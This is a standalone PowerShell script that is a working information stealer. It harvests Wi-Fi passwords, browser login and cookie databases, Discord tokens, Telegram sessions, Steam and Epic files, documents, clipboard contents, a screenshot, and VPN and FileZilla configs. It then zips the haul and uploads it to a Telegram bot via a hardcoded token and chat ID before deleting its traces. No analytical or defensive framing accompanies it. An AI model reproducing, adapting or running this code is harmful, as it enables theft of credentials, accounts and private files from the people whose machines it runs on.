function Start-Execution {
    param (
        [string]$BotToken = "8392193092:AAFeBWyOvc9FynF-wLYTdqHqSJBu5X-QRkQ",
        [string]$ChatID = "1266539824"
    )

    # Temporary storage for logs
    $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
    New-Item -Path $tempDir -ItemType Directory -Force | Out-Null

    # --- Start Data Collection ---
    
    # 1. System Information
    Get-SystemInfo -OutDirectory "$tempDir\System"

    # 2. Browser Data (Passwords, Cookies, History, Autofill)
    Get-BrowserData -OutDirectory "$tempDir\Browsers"

    # 3. File Collection
    Gather-Files -OutDirectory "$tempDir\Files"

    # 4. Game Launchers Data (Steam, Epic Games)
    Get-GameLauncherData -OutDirectory "$tempDir\Gaming"

    # 5. Messenger Data (Telegram, Discord)
    Get-MessengerData -OutDirectory "$tempDir\Messengers"

    # 6. Take Screenshot
    Take-Screenshot -OutFile "$tempDir\screenshot.png"

    # 7. Keylogger & Clipboard (Conceptual - runs for a short period)
    # For a persistent keylogger, a more advanced implant is needed. This is a snapshot.
    Get-UserActivity -OutDirectory "$tempDir\Activity"

    # 8. VPN/FTP Configs
    Get-VpnFtpData -OutDirectory "$tempDir\Network"

    # --- Finalize and Exfiltrate ---
    $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

    # Send data to Telegram
    Send-ResultToTelegram -BotToken $BotToken -ChatID $ChatID -ZipPath $zipPath -SystemInfoPath "$tempDir\System\user_info.txt"

    # --- Cleanup ---
    Remove-Item -Path $tempDir -Recurse -Force
    Remove-Item -Path $zipPath -Force
    
    # Self-destruct (optional, can be unstable)
    # Remove-Item $MyInvocation.MyCommand.Path -Force
}

function Get-SystemInfo {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    
    # Basic user and system info
    $ipConfig = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress
    $externalIp = try { (Invoke-RestMethod -Uri 'https://api.ipify.org').Trim() } catch { "N/A" }
    $userInfo = "Username: $($env:USERNAME)" + "`r`n" +
                "ComputerName: $($env:COMPUTERNAME)" + "`r`n" +
                "Local IP: $($ipConfig.IPAddress -join ', ')" + "`r`n" +
                "External IP: $externalIp"
    $userInfo | Out-File "$OutDirectory\user_info.txt"

    # OS and Hardware
    Get-ComputerInfo | Out-File "$OutDirectory\computer_info.txt"
    
    # Installed Programs
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File "$OutDirectory\installed_programs.txt"
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File -Append "$OutDirectory\installed_programs.txt"

    # WiFi Passwords
    try {
        $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
        $wifiData = foreach ($profile in $wifiProfiles) {
            try {
                $profileData = (netsh wlan show profile name="$profile" key=clear)
                $password = $profileData | Select-String "Key Content\W+\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
                if ($password) {
                    [PSCustomObject]@{SSID=$profile; Password=$password}
                }
            } catch {}
        }
        $wifiData | Format-Table -AutoSize | Out-File "$OutDirectory\wifi_passwords.txt"
    } catch {}
}

function Get-BrowserData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    
    # Paths for major browsers (Chromium-based)
    $browserPaths = @{
        'Google Chrome' = "$env:LOCALAPPDATA\Google\Chrome\User Data";
        'Microsoft Edge' = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";
        'Brave' = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data";
        'Yandex' = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data";
        'Chromium' = "$env:LOCALAPPDATA\Chromium\User Data";
        'Comet' = "$env:LOCALAPPDATA\Comet\User Data";
        'Atlas' = "$env:LOCALAPPDATA\Atlas\User Data";
    }

    foreach ($browser in $browserPaths.Keys) {
        $path = $browserPaths[$browser]
        if (Test-Path $path) {
            $dest = "$OutDirectory\$browser"
            New-Item -Path $dest -ItemType Directory -Force | Out-Null
            
            # Find all profiles
            Get-ChildItem -Path $path -Filter "Login Data", "Cookies", "Web Data", "History" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                $profileName = $_.Directory.Name
                $destProfilePath = "$dest\$profileName"
                New-Item -Path $destProfilePath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
                Copy-Item -Path $_.FullName -Destination $destProfilePath -Force -ErrorAction SilentlyContinue
            }
        }
    }
    # Note: Decrypting 'Login Data' requires external tools or complex logic to handle the OS encryption key. The files are copied as-is.
}

function Gather-Files {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    
    # From Desktop and Documents
    $userDirs = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
    foreach ($dir in $userDirs) {
        if (Test-Path $dir) {
            Copy-Item -Path "$dir\*" -Destination $OutDirectory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    
    # Specific file types from user profile
    Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf -ErrorAction SilentlyContinue | Copy-Item -Destination $OutDirectory -Force -ErrorAction SilentlyContinue
}

function Get-GameLauncherData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null

    # Steam
    $steamPath = (Get-ItemProperty -Path 'HKCU:\Software\Valve\Steam' -Name 'SteamPath' -ErrorAction SilentlyContinue).SteamPath
    if ($steamPath) {
        $steamDest = "$OutDirectory\Steam"
        New-Item -Path $steamDest -ItemType Directory -Force | Out-Null
        Copy-Item -Path "$steamPath\config" -Destination $steamDest -Recurse -Force -ErrorAction SilentlyContinue
        Get-ChildItem -Path $steamPath -Filter "ssfn*" -File | Copy-Item -Destination $steamDest -Force
    }

    # Epic Games
    $epicPath = "$env:LOCALAPPDATA\EpicGamesLauncher\Saved\Config\Windows"
    if (Test-Path $epicPath) {
        Copy-Item -Path $epicPath -Destination "$OutDirectory\EpicGames" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Get-MessengerData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null

    # Discord Tokens
    $discordPaths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb"
    )
    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            $dest = "$OutDirectory\Discord\" + ($path -split '\\')[-3]
            New-Item -Path $dest -ItemType Directory -Force | Out-Null
            Copy-Item -Path "$path\*" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # Telegram Session
    $telegramPath = "$env:APPDATA\Telegram Desktop\tdata"
    if (Test-Path $telegramPath) {
        $dest = "$OutDirectory\Telegram"
        New-Item -Path $dest -ItemType Directory -Force | Out-Null
        Get-ChildItem -Path $telegramPath -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "D877F783D5D3*" -or $_.Name -like "map*"} | Copy-Item -Destination $dest -Force
    }
}

function Take-Screenshot {
    param($OutFile)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen(0, 0, 0, 0, $screen)
        $bitmap.Save($OutFile)
        $graphics.Dispose()
        $bitmap.Dispose()
    } catch {}
}

function Get-UserActivity {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    
    # Clipboard Dump
    try {
        Get-Clipboard | Out-File "$OutDirectory\clipboard.txt"
    } catch {}

    # Keylogging (simplified snapshot)
    # A real keylogger requires continuous hooking. This is just a conceptual placeholder.
    "[Keylogger] To implement a full keylogger, a C# assembly with SetWindowsHookEx is required. This is beyond pure PowerShell." | Out-File "$OutDirectory\keylogger_status.txt"
}

function Get-VpnFtpData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null

    # Search for VPN config files
    Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.ovpn, *.conf -ErrorAction SilentlyContinue | Copy-Item -Destination "$OutDirectory\VPN_Configs" -Force -ErrorAction SilentlyContinue
    
    # FTP Client Data (FileZilla example)
    $filezillaPath = "$env:APPDATA\FileZilla"
    if (Test-Path $filezillaPath) {
        Copy-Item -Path $filezillaPath -Destination "$OutDirectory\FileZilla" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Send-ResultToTelegram {
    param (
        [string]$BotToken,
        [string]$ChatID,
        [string]$ZipPath,
        [string]$SystemInfoPath
    )
    
    $caption = Get-Content $SystemInfoPath | Out-String
    $uri = "https://api.telegram.org/bot$BotToken/sendDocument"
    
    try {
        $response = Invoke-RestMethod -Method Post -Uri $uri -ContentType "multipart/form-data" -Form @{
            chat_id = $ChatID
            document = Get-Item -Path $ZipPath
            caption = $caption
        }
    } catch {
        # Fallback if upload fails
    }
}


Start-Execution
